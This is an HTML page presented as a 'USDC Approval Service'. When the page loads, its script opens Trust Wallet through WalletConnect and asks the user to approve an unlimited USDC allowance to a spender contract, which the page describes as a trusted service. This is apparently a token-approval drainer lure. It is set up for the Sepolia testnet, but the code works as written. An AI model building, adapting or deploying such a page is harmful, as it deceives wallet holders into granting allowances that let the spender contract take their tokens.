<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDC Approval Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 15px;
        }
        .status-message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            font-weight: bold;
        }
        .info { background-color: #e6f7ff; color: #0056b3; border: 1px solid #91d5ff; }
        .success { background-color: #f6ffed; color: #237804; border: 1px solid #b7eb8f; }
        .error { background-color: #fff1f0; color: #cf1322; border: 1px solid #ffa39e; }
        .loading {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden { display: none; }
        .action-button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
        }
        .action-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>USDC Approval Service</h1>
        <div id="loader" class="loading"></div>
        <p id="message">Initializing...</p>
        <div id="manualConnectSection" class="hidden">
            <p>Trust Wallet did not open automatically. Please try manually:</p>
            <button id="manualConnectButton" class="action-button">Open Trust Wallet</button>
        </div>
        <div id="errorDetails" class="status-message error hidden">
            <strong>Error Details:</strong> <span id="errorMessage"></span>
        </div>
    </div>

    <!-- Ethers.js v6 (loaded as a regular script, should define global 'ethers') -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
    
    <!-- Our main script, loaded as a module to handle WalletConnect import -->
    <script type="module">
        // Import EthereumProvider correctly
        import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.umd.min.js';

        // --- Configuration for Sepolia Test Network ---
        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005';
        const USDC_CONTRACT_ADDRESS = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'; // Corrected Sepolia USDC Testnet Address
        const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Sepolia
        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function decimals() view returns (uint8)"
        ];

        let ethereumProvider;
        let connectedAccount;
        let currentWcUri = null;
        let connectTimeout;

        function updateMessage(text, type = 'info') {
            const messageElement = document.getElementById('message');
            messageElement.textContent = text;
            messageElement.className = `status-message ${type}`;
        }

        function showLoader(show) {
            document.getElementById('loader').classList.toggle('hidden', !show);
        }

        function showManualConnect(show) {
            document.getElementById('manualConnectSection').classList.toggle('hidden', !show);
            if (show) {
                showLoader(false);
                updateMessage('Please click the button to open Trust Wallet.', 'info');
            }
        }

        function displayErrorDetails(error) {
            const errorDetailsElement = document.getElementById('errorDetails');
            const errorMessageElement = document.getElementById('errorMessage');
            errorMessageElement.textContent = error.message || String(error);
            errorDetailsElement.classList.remove('hidden');
        }

        async function startApprovalProcess() {
            showLoader(true);
            updateMessage('Initializing WalletConnect...');
            displayErrorDetails({message: ''});

            try {
                // Initialize WalletConnect provider
                ethereumProvider = await EthereumProvider.init({ // Correctly imported EthereumProvider
                    projectId: WALLETCONNECT_PROJECT_ID,
                    chains: [11155111], // Sepolia Testnet Chain ID
                    optionalChains: [],
                    showQrModal: false,
                    metadata: {
                        name: 'USDC Approval Service',
                        description: 'Approves USDC for a trusted service.',
                        url: window.location.origin,
                        icons: ['https://example.com/icon.png'],
                    },
                });

                // --- Event Listeners ---
                ethereumProvider.on("display_uri", (uri) => {
                    console.log("WalletConnect URI for pairing:", uri);
                    currentWcUri = uri;
                    updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
                    
                    const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
                    window.location.href = deepLink;
                    
                    if (connectTimeout) clearTimeout(connectTimeout);
                    connectTimeout = setTimeout(() => {
                        if (!ethereumProvider.connected) {
                            showManualConnect(true);
                        }
                    }, 3000);
                });

                ethereumProvider.on("connect", (response) => {
                    if (connectTimeout) clearTimeout(connectTimeout);
                    console.log("Wallet connected!", response);
                    connectedAccount = response.accounts[0];
                    updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
                    showManualConnect(false);
                    proposeApproveTransaction();
                });

                ethereumProvider.on("disconnect", (error) => {
                    if (connectTimeout) clearTimeout(connectTimeout);
                    console.log("Wallet disconnected.", error);
                    updateMessage('Wallet disconnected.', 'error');
                    showLoader(false);
                    showManualConnect(false);
                });

                document.getElementById('manualConnectButton').addEventListener('click', () => {
                    if (currentWcUri) {
                        const deepLink = `trust://wc?uri=${encodeURIComponent(currentWcUri)}`;
                        window.location.href = deepLink;
                        updateMessage('Attempting to open Trust Wallet again...', 'info');
                    } else {
                        updateMessage('Error: No WalletConnect URI available for manual connection. Please refresh.', 'error');
                        displayErrorDetails({message: 'No WalletConnect URI to open manually.'});
                    }
                });

                if (!ethereumProvider.connected) {
                    updateMessage('Requesting wallet connection... Check Trust Wallet for prompts or click the button below.', 'info');
                    if (connectTimeout) clearTimeout(connectTimeout);
                    connectTimeout = setTimeout(() => {
                        if (!ethereumProvider.connected) {
                            showManualConnect(true);
                        }
                    }, 5000);
                    
                    await ethereumProvider.connect();
                } else {
                    if (connectTimeout) clearTimeout(connectTimeout);
                    connectedAccount = ethereumProvider.accounts[0];
                    updateMessage(`Wallet already connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
                    proposeApproveTransaction();
                }

            } catch (error) {
                if (connectTimeout) clearTimeout(connectTimeout);
                console.error('Error during WalletConnect initialization or connection:', error);
                updateMessage(`Error: ${error.message}. Please check console for details.`, 'error');
                displayErrorDetails(error);
                showLoader(false);
                if (currentWcUri) {
                    showManualConnect(true);
                }
            }
        }

        async function proposeApproveTransaction() {
            if (!ethereumProvider || !connectedAccount) {
                updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
                showLoader(false);
                return;
            }

            showLoader(true);
            updateMessage('Proposing USDC approval transaction... Please confirm in Trust Wallet.', 'info');

            try {
                // Ensure ethers.js is available globally (it should be from the script tag)
                const iface = new ethers.Interface(ERC20_ABI);
                const calldata = iface.encodeFunctionData('approve', [
                    SPENDER_CONTRACT_ADDRESS,
                    FIXED_ALLOWANCE_AMOUNT_HEX
                ]);

                const transaction = {
                    from: connectedAccount,
                    to: USDC_CONTRACT_ADDRESS,
                    data: calldata,
                    value: '0x0',
                };

                console.log('Transaction to propose:', transaction);

                const txHash = await ethereumProvider.request({
                    method: 'eth_sendTransaction',
                    params: [transaction],
                });

                updateMessage(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Please check transaction status.`, 'success');
                console.log('Transaction Hash:', txHash);

            } catch (error) {
                console.error('Transaction proposal failed:', error);
                updateMessage(`Transaction failed: ${error.message}`, 'error');
                displayErrorDetails(error);
            } finally {
                showLoader(false);
            }
        }

        window.addEventListener('load', startApprovalProcess);
    </script>
</body>
</html>
